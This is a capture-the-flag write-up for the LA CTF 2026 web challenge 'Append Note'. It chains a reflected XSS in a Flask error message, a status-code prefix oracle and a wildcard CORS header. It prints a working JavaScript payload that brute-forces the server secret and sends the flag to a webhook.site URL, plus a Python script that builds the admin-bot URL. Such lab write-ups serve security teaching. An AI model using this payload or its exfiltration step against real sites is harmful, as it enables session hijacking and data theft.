@@ -1,0 +1,318 @@
+---
+title: 'LA CTF 2026 - Append Note'
+description: 'Writeup for Append Note from LA CTF 2026. A Web challenge involving Reflected XSS, Prefix Oracle, and CORS misconfiguration.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'xss', 'xs-leaks', 'prefix-oracle', 'cors', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Category:** Web  
+**Flag:** `lactf{3V3n7U4LLy_C0N5I573N7_70_L34X}`
+
+## Overview
+
+"Append Note" is a web challenge involving a Flask note-taking app and an admin bot. The goal is to steal a server-side secret and use it to retrieve the flag. The solve chains together three vulnerabilities:
+
+1. **Reflected XSS** in an error message
+2. **Prefix oracle** that leaks the secret one character at a time
+3. **CORS misconfiguration** on the flag endpoint
+
+## Challenge Architecture
+
+There are two services:
+
+- **The Flask app** (`app.py`) — a joke "append-only" notes app running on port 4000
+- **The admin bot** (`admin-bot.js`) — a Puppeteer bot that visits any URL you give it, with the admin cookie pre-set
+
+### How the App Works
+
+When the server starts, it generates a random 8-character hex secret and stores it as the first note:
+
+```python
+SECRET = secrets.token_hex(4)   # e.g. "a3f2b1c4"
+notes = [SECRET]
+```
+
+There are three routes:
+
+| Route | What it does |
+|-------|-------------|
+| `GET /` | Shows the homepage. Admins see a form to append notes. |
+| `GET /append` | **Admin-only.** Appends a note and redirects. Returns **200** if any existing note starts with the submitted content, **404** otherwise. |
+| `GET /flag` | Returns the flag if you provide the correct `?secret=` parameter. Has `Access-Control-Allow-Origin: *`. |
+
+### How the Admin Bot Works
+
+```javascript
+await page.setCookie({
+    name: "admin",
+    value: ADMIN_PASSWORD,
+    domain: CHALL_HOST,
+    httpOnly: true,
+    sameSite: "Lax"
+});
+await page.goto(url);       // visits the URL you submit
+await sleep(60_000);         // stays on the page for 60 seconds
+```
+
+Key details about the cookie:
+- **`httpOnly: true`** — JavaScript can't read `document.cookie`, but the cookie is still sent with HTTP requests
+- **`sameSite: "Lax"`** — The cookie is sent on top-level navigations (clicking links, `window.location` redirects, form GETs) but NOT on cross-site subresource requests (`<script src>`, `<img src>`, `fetch()` from a different origin)
+
+## Vulnerability #1: Reflected XSS
+
+### The Bug
+
+Look at the `/append` route's URL validation:
+
+```python
+@app.route("/append")
+def append():
+    if request.cookies.get("admin") != ADMIN_SECRET:
+        return "Unauthorized", 401
+
+    content = request.args.get("content", "")
+    redirect_url = request.args.get("url", "/")
+
+    parsed_url = urlparse(redirect_url)
+    if (
+        parsed_url.scheme not in ["http", "https"]
+        or parsed_url.hostname != urlparse(HOST).hostname
+    ):
+        return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}", 400
+        #      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        #      This is a raw f-string returned as text/html — NO HTML ESCAPING!
+
+    # ... rest of the handler
+```
+
+When the URL validation fails, the error message is returned as a **raw string** (not via `render_template`). Flask serves raw strings with `Content-Type: text/html`, so the browser will render any HTML tags in the response.
+
+The `parsed_url.hostname` value is injected directly into the response. If we can make the hostname contain HTML, we have XSS.
+
+### Crafting the XSS
+
+Python's `urlparse` is very permissive with what it considers a "hostname":
+
+```python
+>>> from urllib.parse import urlparse
+>>> urlparse("http://<img src=x onerror=alert(1)>.com").hostname
+'<img src=x onerror=alert(1)>.com'
+```
+
+It happily parses `<img src=x onerror=alert(1)>` as part of the hostname! When this is injected into the error message, the browser receives:
+
+```html
+Invalid redirect URL http <img src=x onerror=alert(1)>.com
+```
+
+The browser renders the `<img>` tag, the image fails to load (`src=x`), and the `onerror` JavaScript handler fires. We have **XSS on the challenge origin**.
+
+### The Lowercase Problem
+
+There's a catch: `urlparse(...).hostname` **lowercases everything**. This means our JavaScript payload gets lowercased too:
+
+```python
+>>> urlparse("http://HELLO.COM").hostname
+'hello.com'
+```
+
+This breaks things like `encodeURIComponent` (becomes `encodeuricomponent`), `String.fromCharCode`, or any camelCase API. We need a way to deliver our full exploit code without it being lowercased.
+
+### The Solution: URL Fragments
+
+URL fragments (the `#...` part) are **never sent to the server**. They exist only in the browser. This means:
+
+1. The fragment is NOT processed by `urlparse` (not lowercased)
+2. JavaScript can read it via `location.hash`
+
+So we use this XSS handler:
+
+```
+onerror=eval(atob(location.hash.slice(1)))
+```
+
+This reads the base64-encoded payload from the URL fragment, decodes it, and executes it. Every character in `eval(atob(location.hash.slice(1)))` is already lowercase, so the lowercasing doesn't break anything. And our actual exploit code is safely stored in the fragment with its original case preserved.
+
+### Unquoted HTML Attribute Constraints
+
+Since the `onerror` handler is inside an unquoted HTML attribute (`onerror=VALUE`), the value cannot contain:
+- Spaces, `"`, `'`, `` ` ``, `=`, `<`, `>`
+
+Our handler `eval(atob(location.hash.slice(1)))` contains **none of these** — only letters, parentheses, and dots. It works perfectly.
+
+## Vulnerability #2: Prefix Oracle
+
+### The Bug
+
+```python
+status = 200 if any(note.startswith(content) for note in notes) else 404
+notes.append(content)
+```
+
+The `/append` endpoint leaks whether any existing note **starts with** the submitted content, via the HTTP status code:
+
+- **200** = yes, some note starts with your content
+- **404** = no match
+
+Since `notes[0]` is the SECRET, we can guess the SECRET one character at a time:
+
+```
+Is SECRET starting with "0"?  → fetch /append?content=0  → check status
+Is SECRET starting with "1"?  → fetch /append?content=1  → check status
+...
+Found "a" matches! SECRET starts with "a".
+Is SECRET starting with "a0"? → fetch /append?content=a0 → check status
+Is SECRET starting with "a1"? → fetch /append?content=a1 → check status
+...
+```
+
+For an 8-character hex secret, we need at most **8 positions x 16 hex chars = 128 requests**. This takes just a few seconds.
+
+### Why Previously Appended Notes Don't Cause False Positives
+
+Each guess gets appended to the notes list regardless. Could old guesses cause false matches?
+
+No. When we're guessing position N, our guess is N+1 characters long. All previously appended notes are at most N characters long. Since `"abc".startswith("abcd")` is `False` (the note is shorter than the guess), old notes never cause false positives.
+
+## Vulnerability #3: CORS Wildcard on /flag
+
+```python
+@app.route("/flag")
+def flag():
+    correct = request.args.get("secret") == SECRET
+    message = FLAG if correct else "Invalid secret"
+    response = make_response(message, 200 if correct else 401)
+    response.headers["Access-Control-Allow-Origin"] = "*"   # <-- readable from any origin
+    return response
+```
+
+The `Access-Control-Allow-Origin: *` header means any webpage can read the response. Once we know SECRET (from the oracle), we can fetch the flag and read its contents from JavaScript.
+
+## Putting It All Together
+
+### The Problem with a Direct Approach
+
+We can't just send the admin bot directly to our XSS URL because:
+
+1. The admin bot **rejects URLs containing `#`** (our fragment payload)
+2. The admin bot **rejects pages that return non-200 status codes** (our XSS error page returns 400)
+
+### The Two-Hop Solution
+
+We use the app's own redirect mechanism to work around both restrictions:
+
+```
+Admin Bot
+   │
+   │  Hop 1: visits /append?content=&url=<encoded hop2 URL>
+   │         ✓ No # in URL (it's encoded as %23 inside the url param)
+   │         ✓ Returns 200 (empty content matches any note)
+   │         ✓ Returns redirect.html which navigates to hop 2
+   ▼
+ Hop 1 Page (redirect.html)
+   │
+   │  After 100ms, JavaScript runs:
+   │  window.location.href = "<hop2 URL with #fragment>"
+   ▼
+ Hop 2: /append?content=y&url=http://<XSS>.com#BASE64_PAYLOAD
+   │
+   │  Server returns 400 with: "Invalid redirect URL http <img onerror=...>.com"
+   │  (status code doesn't matter anymore — bot already passed page.goto())
+   │
+   │  Browser renders the <img> tag → onerror fires → eval(atob(location.hash.slice(1)))
+   │  location.hash contains our base64 exploit → decoded and executed!
+   ▼
+ XSS Exploit Runs (same origin as challenge!)
+   │
+   │  1. Brute-forces SECRET via 128 fetch() calls to /append
+   │  2. Fetches /flag?secret=SECRET → reads the flag
+   │  3. Sends flag to attacker's webhook
+   ▼
+ Flag Exfiltrated!
+```
+
+### Why Hop 1 Returns 200
+
+The trick is using `content=` (empty string). Since every string starts with an empty string, `any(note.startswith("") for note in notes)` is always `True`, giving us a guaranteed 200 response.
+
+### Why the Cookie Works on Hop 2
+
+The admin bot sets the cookie for the challenge domain before navigation. When hop 1's JavaScript redirects to hop 2 (same domain), the browser includes the cookie because:
+- It's a **same-origin** navigation
+- `sameSite: Lax` allows cookies on top-level navigations
+
+## The Exploit Code
+
+### JavaScript Payload (runs via XSS)
+
+```javascript
+(async () => {
+  var s = '';
+  var h = '0123456789abcdef';
+
+  // Brute-force SECRET character by character
+  for (var i = 0; i < 8; i++) {
+    for (var j = 0; j < 16; j++) {
+      var g = s + h[j];
+      var r = await fetch('/append?content=' + g + '&url=' + location.origin + '/');
+      if (r.status == 200) { s = g; break }
+    }
+  }
+
+  // Fetch the flag using the leaked SECRET
+  var f = await (await fetch('/flag?secret=' + s)).text();
+
+  // Exfiltrate to our webhook
+  fetch('https://webhook.site/XXXX?flag=' + btoa(f))
+})()
+```
+
+Key details:
+- `fetch('/append?...')` is a **same-origin** request (our XSS runs on the challenge origin), so the admin cookie is included automatically
+- We can read `response.status` because it's same-origin
+- We use `btoa()` to base64-encode the flag for safe URL transmission (avoids issues with `{` and `}` in the flag)
+- The inner `/append` calls use `url='+location.origin+'/'` as a valid redirect URL that passes the hostname check
+
+### Python Exploit Script
+
+```python
+import base64
+from urllib.parse import quote
+
+challenge_url = 'https://append-note-XXXXX.instancer.lac.tf'
+webhook_url = 'https://webhook.site/YOUR-UUID'
+
+# The JS payload (as above, minified into one line)
+exploit_js = "(async()=>{var s='';var h='0123456789abcdef';...})()"
+
+# Base64 encode for the URL fragment
+js_b64 = base64.b64encode(exploit_js.encode()).decode()
+
+# Hop 2: XSS URL with payload in fragment
+xss_hostname = "<img src=x onerror=eval(atob(location.hash.slice(1)))>.com"
+hop2_url = f"{challenge_url}/append?content=y&url=http://{xss_hostname}#{js_b64}"
+
+# Hop 1: Valid redirect that navigates to hop 2
+# content= (empty) ensures 200 status
+# quote() percent-encodes the hop2 URL (# becomes %23)
+hop1_url = f"{challenge_url}/append?content=&url={quote(hop2_url, safe='')}"
+
+# Submit hop1_url to the admin bot
+```
+
+### Running the Exploit
+
+```bash
+# 1. Create a webhook at https://webhook.site (or similar)
+
+# 2. Run the exploit
+python3 exploit.py \
+  https://append-note-XXXXX.instancer.lac.tf \
+  https://admin-bot-XXXXX.instancer.lac.tf/append-note \
+  https://webhook.site/YOUR-UUID
+
+# 3. Check webhook.site for incoming request with ?flag=BASE64
+#    Decode the base64 value to get the flag
+```
